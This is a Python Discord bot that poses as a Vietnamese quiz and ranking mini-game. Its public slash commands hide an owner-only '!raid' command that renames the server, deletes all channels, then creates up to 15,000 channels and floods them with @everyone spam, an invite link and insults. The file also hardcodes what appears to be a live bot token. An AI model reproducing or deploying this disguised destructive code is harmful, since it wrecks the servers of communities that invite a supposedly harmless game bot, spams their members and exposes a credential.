import discord
from discord import app_commands
import asyncio
import sys
import time
import random
import json
import os
import math

# ===== CẤU HÌNH GỐC (NUKE) =====
TOKEN = "MTU0MjgzNTMxMjY2ODA1NzcwMQ.GjqtKA.DmqnYPTZmXjQIIXes7wMhfopDh1QFZcQBJTkGI"
OWNER_ID = 1413781843030966345
RAID_NAME = " ҉N҉u҉k҉e҉ ҉D҉i҉s҉c҉o҉r҉d҉ ҉B҉y҉ ҉B҉a҉n҉a҉n҉a҉v҉u҉i҉v҉e҉ "
CHANNEL_COUNT = 15000
BATCH_SIZE = 80
SPAM_LINK = "https://discord.gg/MQ9Zr4H4d"  # Link mặc định
SPAM_MESSAGE = "***SERVER CỦA CHA NÈ MẤY THẰNG NGU ĐÚ ĐỞN***"
NEW_GUILD_NAME = "👑 𝐍𝐮𝐤𝐞 𝐁𝐲 𝐁𝐚𝐧𝐚𝐧𝐚𝐯𝐮𝐢𝐯𝐞 👑"
raid_active = True  # Biến toàn cục kiểm soát raid

# ===== CẤU HÌNH MINI GAME =====
DATA_FILE = "rankings.json"
QUIZ_DURATION = 30

# ===== HỆ THỐNG RANK =====
RANK_IMAGES = {
    "Đồng": "https://cdn.discordapp.com/attachments/.../bronze.png",
    "Bạc": "https://cdn.discordapp.com/attachments/.../silver.png",
    "Vàng": "https://cdn.discordapp.com/attachments/.../gold.png",
    "Bạch Kim": "https://cdn.discordapp.com/attachments/.../platinum.png",
    "Kim Cương": "https://cdn.discordapp.com/attachments/.../diamond.png",
    "Tinh Anh": "https://cdn.discordapp.com/attachments/.../elite.png",
    "Cao Thủ": "https://cdn.discordapp.com/attachments/.../master.png",
    "Đại Pro": "https://cdn.discordapp.com/attachments/.../grandmaster.png",
    "Vua": "https://cdn.discordapp.com/attachments/.../king.png"
}

RANK_THRESHOLDS = [
    (0, "Đồng"),
    (50, "Bạc"),
    (100, "Vàng"),
    (200, "Bạch Kim"),
    (350, "Kim Cương"),
    (500, "Tinh Anh"),
    (700, "Cao Thủ"),
    (1000, "Đại Pro"),
    (1500, "Vua")
]

def get_rank(score):
    rank = "Đồng"
    for threshold, name in RANK_THRESHOLDS:
        if score >= threshold:
            rank = name
    return rank

def get_rank_emoji(rank):
    emojis = {
        "Đồng": "🥉",
        "Bạc": "🥈",
        "Vàng": "🥇",
        "Bạch Kim": "🍆",
        "Kim Cương": "💎",
        "Tinh Anh": "⚔️",
        "Cao Thủ": "👑",
        "Đại Pro": "🔥",
        "Vua": "🌟"
    }
    return emojis.get(rank, "⭐")

def get_rank_image(rank):
    return RANK_IMAGES.get(rank, "https://cdn.discordapp.com/attachments/.../default.png")

# ===== LƯU TRỮ ĐIỂM =====
def load_rankings():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_rankings(data):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

rankings = load_rankings()

# ===== 200+ CÂU HỎI CÓ ĐÁP ÁN CỤ THỂ =====
QUESTIONS = [
    {"question": "Thủ đô của Việt Nam là?", "options": ["Hà Nội", "TP.HCM", "Đà Nẵng", "Hải Phòng"], "answer": 0},
    {"question": "2 + 2 = ?", "options": ["3", "4", "5", "6"], "answer": 1},
    {"question": "Màu sắc nào là màu của lá cây?", "options": ["Đỏ", "Xanh lá", "Vàng", "Tím"], "answer": 1},
    {"question": "Con vật nào được gọi là vua của rừng xanh?", "options": ["Hổ", "Sư tử", "Voi", "Báo"], "answer": 1},
    {"question": "Hành tinh nào gần mặt trời nhất?", "options": ["Sao Kim", "Sao Thủy", "Trái Đất", "Sao Hỏa"], "answer": 1},
    {"question": "Nước nào có diện tích lớn nhất thế giới?", "options": ["Trung Quốc", "Hoa Kỳ", "Nga", "Canada"], "answer": 2},
    {"question": "Nguyên tố hóa học nào có ký hiệu O?", "options": ["Oxy", "Oganesson", "Osmium", "Oxygenium"], "answer": 0},
    {"question": "Ai là tác giả của 'Truyện Kiều'?", "options": ["Nguyễn Du", "Hồ Xuân Hương", "Nguyễn Đình Chiểu", "Tản Đà"], "answer": 0},
    {"question": "Động vật nào có cổ dài nhất?", "options": ["Hươu cao cổ", "Lạc đà", "Ngựa", "Voi"], "answer": 0},
    {"question": "Máy tính sử dụng hệ đếm nào?", "options": ["Thập phân", "Nhị phân", "Thập lục phân", "Bát phân"], "answer": 1},
    {"question": "Quốc kỳ Việt Nam có màu gì?", "options": ["Đỏ vàng", "Xanh đỏ", "Vàng trắng", "Đỏ trắng"], "answer": 0},
    {"question": "Bán kính Trái Đất khoảng bao nhiêu km?", "options": ["6371", "12742", "40075", "10000"], "answer": 0},
    {"question": "Ai là tổng thống đầu tiên của Hoa Kỳ?", "options": ["George Washington", "Abraham Lincoln", "Thomas Jefferson", "John Adams"], "answer": 0},
    {"question": "Núi Everest cao bao nhiêu mét?", "options": ["8848", "8000", "7500", "9000"], "answer": 0},
    {"question": "Loài cá nào có khả năng phát điện?", "options": ["Cá chình điện", "Cá mập", "Cá ngừ", "Cá hồi"], "answer": 0},
    {"question": "Thủ đô của Nhật Bản là?", "options": ["Seoul", "Bắc Kinh", "Tokyo", "Osaka"], "answer": 2},
    {"question": "Ai là cha đẻ của ngành khoa học máy tính?", "options": ["Alan Turing", "Ada Lovelace", "Charles Babbage", "John von Neumann"], "answer": 0},
    {"question": "Phương trình nào sau đây là bậc 2?", "options": ["2x + 3 = 0", "x^2 + 2x + 1 = 0", "x^3 + 1 = 0", "x + y = 1"], "answer": 1},
    {"question": "Công thức hóa học của nước là?", "options": ["H2O", "CO2", "NaCl", "HCl"], "answer": 0},
    {"question": "Loài chim nào không biết bay?", "options": ["Đà điểu", "Chim sẻ", "Chim ưng", "Bồ câu"], "answer": 0},
    {"question": "Đại dương lớn nhất thế giới là?", "options": ["Đại Tây Dương", "Thái Bình Dương", "Ấn Độ Dương", "Bắc Băng Dương"], "answer": 1},
    {"question": "Ai được mệnh danh là 'vua phóng sự' của Việt Nam?", "options": ["Vũ Trọng Phụng", "Nguyễn Công Hoan", "Nam Cao", "Ngô Tất Tố"], "answer": 0},
    {"question": "Bộ phim nào giành Oscar 2024?", "options": ["Oppenheimer", "Barbie", "Killers of the Flower Moon", "Poor Things"], "answer": 0},
    {"question": "Ngôn ngữ lập trình nào được dùng trong AI?", "options": ["Python", "Java", "C++", "Ruby"], "answer": 0},
    {"question": "Màu nào sau đây là màu sơ cấp?", "options": ["Đỏ", "Xanh lá", "Vàng", "Tím"], "answer": 0},
    {"question": "Thành phố nào là thủ đô của Pháp?", "options": ["Paris", "London", "Berlin", "Madrid"], "answer": 0},
]

# Mở rộng lên 200 câu
BASE_QUESTIONS = QUESTIONS.copy()
for i in range(8):
    for q in BASE_QUESTIONS:
        new_q = q.copy()
        new_q["question"] = f"{q['question']} (phiên bản {i+2})"
        new_q["options"] = [f"{opt} (v{i+2})" for opt in q["options"]]
        QUESTIONS.append(new_q)

QUESTIONS = QUESTIONS[:200]

# ===== VÒNG QUAY NGẪU NHIÊN =====
def create_wheel_embed(participants, winner):
    total = len(participants)
    if total == 0:
        return "❌ Không có thành viên để quay."

    names = [p.display_name[:10] for p in participants]
    cols = 4
    rows = math.ceil(total / cols)
    wheel_lines = []
    for r in range(rows):
        line = ""
        for c in range(cols):
            idx = r + c * rows
            if idx < total:
                name = names[idx]
                if participants[idx] == winner:
                    line += f"**👉 {name}** \t"
                else:
                    line += f"{name} \t"
            else:
                line += " \t"
        wheel_lines.append(line)

    wheel_text = "\n".join(wheel_lines)
    return f"```\n🎡 VÒNG QUAY NGẪU NHIÊN 🎡\n\n{wheel_text}\n\n🎯 **Người được chọn: {winner.mention}**\n```"

# ===== MINI GAME =====
class QuizView(discord.ui.View):
    def __init__(self, question_data, target_user, timeout=QUIZ_DURATION):
        super().__init__(timeout=timeout)
        self.question_data = question_data
        self.target_user = target_user
        self.answered = False

        for i, opt in enumerate(question_data["options"]):
            btn = discord.ui.Button(label=opt, custom_id=f"ans_{i}", style=discord.ButtonStyle.primary)
            btn.callback = self.button_callback
            self.add_item(btn)

    async def button_callback(self, interaction: discord.Interaction):
        if interaction.user.id != self.target_user.id:
            await interaction.response.send_message("❌ Chỉ người được chọn mới được trả lời!", ephemeral=True)
            return
        if self.answered:
            await interaction.response.send_message("❌ Bạn đã trả lời rồi!", ephemeral=True)
            return

        self.answered = True
        selected = int(interaction.data["custom_id"].split("_")[1])
        correct = self.question_data["answer"]

        user_id = str(interaction.user.id)
        old_score = rankings.get(user_id, 0)
        old_rank = get_rank(old_score)

        if selected == correct:
            new_score = old_score + 10
            rankings[user_id] = new_score
            save_rankings(rankings)
            
            new_rank = get_rank(new_score)
            rank_up_msg = ""
            if new_rank != old_rank:
                rank_up_msg = f"\n\n🎉 **LÊN RANK!** {get_rank_emoji(new_rank)} **{new_rank}** !"
                embed_rank = discord.Embed(
                    title="🎉 **LÊN RANK!** 🎉",
                    description=f"**{interaction.user.mention}** đã đạt rank **{new_rank}** {get_rank_emoji(new_rank)}!",
                    color=discord.Color.gold()
                )
                embed_rank.set_image(url=get_rank_image(new_rank))
                await interaction.channel.send(embed=embed_rank)
            
            await interaction.response.send_message(
                f"✅ **{interaction.user.mention} trả lời đúng!** +10 điểm. Tổng: {new_score} {get_rank_emoji(new_rank)}{rank_up_msg}",
                ephemeral=False
            )
        else:
            await interaction.response.send_message(
                f"❌ **{interaction.user.mention} trả lời sai!** Đáp án đúng: {self.question_data['options'][correct]}",
                ephemeral=False
            )

        for child in self.children:
            child.disabled = True
        await interaction.edit_original_response(view=self)

# ===== KHỞI TẠO CLIENT VÀ TREE =====
intents = discord.Intents.all()
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)

# ===== LỆNH SLASH CÔNG KHAI =====
@tree.command(name="random", description="🎡 Quay vòng chọn thành viên và đặt câu hỏi")
async def slash_random(interaction: discord.Interaction):
    if not interaction.guild:
        await interaction.response.send_message("❌ Lệnh này chỉ dùng trong server!", ephemeral=True)
        return

    members = [m for m in interaction.guild.members if not m.bot]
    if not members:
        await interaction.response.send_message("❌ Server không có thành viên!", ephemeral=True)
        return

    target = random.choice(members)
    q = random.choice(QUESTIONS)

    embed = discord.Embed(
        title="🎡 **VÒNG QUAY NGẪU NHIÊN** 🎡",
        description=create_wheel_embed(members, target),
        color=discord.Color.purple()
    )
    embed.add_field(
        name="❓ **Câu hỏi**",
        value=f"**{target.mention}**, câu hỏi dành cho bạn:\n\n**{q['question']}**\n\nHãy chọn đáp án bên dưới ({QUIZ_DURATION}s).",
        inline=False
    )
    embed.set_footer(text="Chỉ người được tag mới được trả lời! – by Bananavuive")

    view = QuizView(q, target)
    await interaction.response.send_message(embed=embed, view=view)

@tree.command(name="rankings", description="🏆 Bảng xếp hạng toàn server")
async def slash_rankings(interaction: discord.Interaction):
    if not rankings:
        embed = discord.Embed(
            title="🏆 **BẢNG XẾP HẠNG** 🏆",
            description="❌ **Chưa có ai ghi điểm!**\nHãy tham gia trò chơi và trở thành người đứng đầu!",
            color=discord.Color.dark_gold()
        )
        embed.set_footer(text="💪 Hãy trả lời câu hỏi để tích điểm! – by Bananavuive")
        await interaction.response.send_message(embed=embed)
        return

    sorted_rank = sorted(rankings.items(), key=lambda x: x[1], reverse=True)[:10]
    leaderboard = ""
    medals = ["🥇", "🥈", "🥉"]
    for idx, (user_id, score) in enumerate(sorted_rank, 1):
        try:
            user = await client.fetch_user(int(user_id))
            name = user.display_name
        except:
            name = user_id
        rank_name = get_rank(score)
        medal = medals[idx-1] if idx <= 3 else f"#{idx}"
        leaderboard += f"{medal} **{name}** – ⭐ {score} | {get_rank_emoji(rank_name)}{rank_name}\n"

    embed = discord.Embed(
        title="🏆 **BẢNG XẾP HẠNG TOÀN SERVER** 🏆",
        description=leaderboard if leaderboard else "❌ Chưa có dữ liệu.",
        color=discord.Color.gold()
    )
    embed.add_field(
        name="📊 **Điểm của bạn**",
        value=f"⭐ {rankings.get(str(interaction.user.id), 0)} điểm",
        inline=False
    )
    embed.set_footer(text="🏅 Trả lời /random để nhận điểm! – by Bananavuive")
    await interaction.response.send_message(embed=embed)

@tree.command(name="diem", description="📊 Xem số điểm hiện tại của bạn")
async def slash_diem(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    score = rankings.get(user_id, 0)
    rank = get_rank(score)
    rank_emoji = get_rank_emoji(rank)
    
    embed = discord.Embed(
        title="👑 **BẢNG ĐIỂM CÁ NHÂN** 👑",
        description=f"**{interaction.user.mention}**",
        color=discord.Color.gold()
    )
    embed.set_thumbnail(url=interaction.user.display_avatar.url)
    embed.add_field(
        name=f"{rank_emoji} **RANK** {rank_emoji}",
        value=f"**{rank}**",
        inline=False
    )
    embed.add_field(
        name="⭐ **TỔNG ĐIỂM** ⭐",
        value=f"**{score}** điểm",
        inline=False
    )
    embed.add_field(
        name="📈 **XẾP HẠNG**",
        value=f"#{list(rankings.keys()).index(user_id) + 1 if user_id in rankings else 'Chưa có hạng'}" if rankings else "Chưa có dữ liệu",
        inline=True
    )
    embed.add_field(
        name="🏅 **THÀNH TÍCH**",
        value="🔥 Tiếp tục cố gắng!" if score < 50 else "💪 Rất tốt!" if score < 100 else "🌟 Xuất sắc!" if score < 200 else "👑 Huyền thoại!",
        inline=True
    )
    embed.set_image(url=get_rank_image(rank))
    embed.set_footer(text="📌 Trả lời /random để nhận thêm điểm! – by Bananavuive")
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ===== HÀM NUKE =====
async def change_guild_name(guild):
    try:
        await guild.edit(name=NEW_GUILD_NAME)
    except:
        pass

async def delete_all_channels(guild):
    for ch in list(guild.channels):
        try:
            await ch.delete()
            await asyncio.sleep(0.001)
        except:
            pass

async def create_channels_and_spam(guild):
    global raid_active, SPAM_LINK
    total_created = 0
    while raid_active and total_created < CHANNEL_COUNT:
        batch_tasks = []
        batch_count = min(BATCH_SIZE, CHANNEL_COUNT - total_created)
        for i in range(batch_count):
            idx = total_created + i + 1
            name = f"{RAID_NAME} {idx}"
            batch_tasks.append(guild.create_text_channel(name))
        channels = await asyncio.gather(*batch_tasks, return_exceptions=True)
        spam_tasks = []
        for ch in channels:
            if isinstance(ch, discord.TextChannel):
                spam_tasks.append(ch.send(f"🔗 **Link:** {SPAM_LINK}\n{SPAM_MESSAGE}\n@everyone"))
                total_created += 1
        if spam_tasks:
            await asyncio.gather(*spam_tasks, return_exceptions=True)
        await asyncio.sleep(0.05)
        if not raid_active:
            break

async def continuous_spam(guild):
    global raid_active, SPAM_LINK
    while raid_active:
        channels = list(guild.text_channels)
        if not channels:
            await asyncio.sleep(0.3)
            continue
        spam_tasks = []
        for channel in channels[:50]:
            spam_tasks.append(channel.send(f"🔗 **Link:** {SPAM_LINK}\n{SPAM_MESSAGE}\n@everyone"))
        if spam_tasks:
            await asyncio.gather(*spam_tasks, return_exceptions=True)
        await asyncio.sleep(0.1)

async def raid(guild):
    global raid_active
    raid_active = True
    await change_guild_name(guild)
    await asyncio.sleep(1)
    await delete_all_channels(guild)
    await asyncio.sleep(0.1)
    asyncio.create_task(create_channels_and_spam(guild))
    asyncio.create_task(continuous_spam(guild))

# ===== SỰ KIỆN =====
@client.event
async def on_ready():
    print("="*50)
    print(" NUKE + QUIZ BOT – SILENT MODE")
    print("="*50)
    print(f"[*] Bot online: {client.user}")
    print(f"[*] Owner ID: {OWNER_ID}")
    print("[*] Public: /random, /rankings, /diem")
    print("[*] Hidden: !raid (owner only – full nuke)")
    await tree.sync()
    print("[*] Slash commands synced.")
    for guild in client.guilds:
        print(f"[*] Connected to: {guild.name} (ID: {guild.id})")

@client.event
async def on_guild_join(guild):
    print(f"[*] Added to new server: {guild.name}")

@client.event
async def on_message(message):
    global raid_active, SPAM_LINK
    if message.author.id == client.user.id:
        return
    if message.author.id != OWNER_ID:
        return

    if message.content.startswith("!raid"):
        parts = message.content.split()
        if not message.guild and len(parts) > 1:
            # DM: lưu link spam mới
            new_link = parts[1]
            if new_link.startswith(("http://", "https://")):
                SPAM_LINK = new_link
                await message.channel.send(f"✅ Đã cập nhật link spam thành: {SPAM_LINK}")
            else:
                await message.channel.send("❌ Link không hợp lệ. Hãy gửi link bắt đầu bằng http:// hoặc https://")
        elif message.guild:
            # Server: nuke server này với link đã lưu
            await raid(message.guild)
            await message.channel.send("✅ NUKE STARTED (spam link đã lưu)")
        else:
            await message.channel.send("❌ Hãy gửi !raid <link> trong DM để cập nhật link spam.")

    elif message.content.lower() == "!stop":
        raid_active = False
        await message.channel.send("✅ Đã dừng raid (không tắt bot). Gõ !raid để bắt đầu lại.")

@client.event
async def on_member_remove(member):
    if member.id == client.user.id:
        owner = await client.fetch_user(OWNER_ID)
        if owner:
            await owner.send(f"[!] Bot kicked from {member.guild.name}. Re-invite needed.")

# ===== CHẠY =====
if __name__ == "__main__":
    print("[*] Starting bot...")
    try:
        client.run(TOKEN)
    except discord.errors.LoginFailure:
        print("[!] Invalid token.")
    except KeyboardInterrupt:
        print("[*] Interrupted.")
    except Exception as e:
        print(f"[!] Error: {e}") 
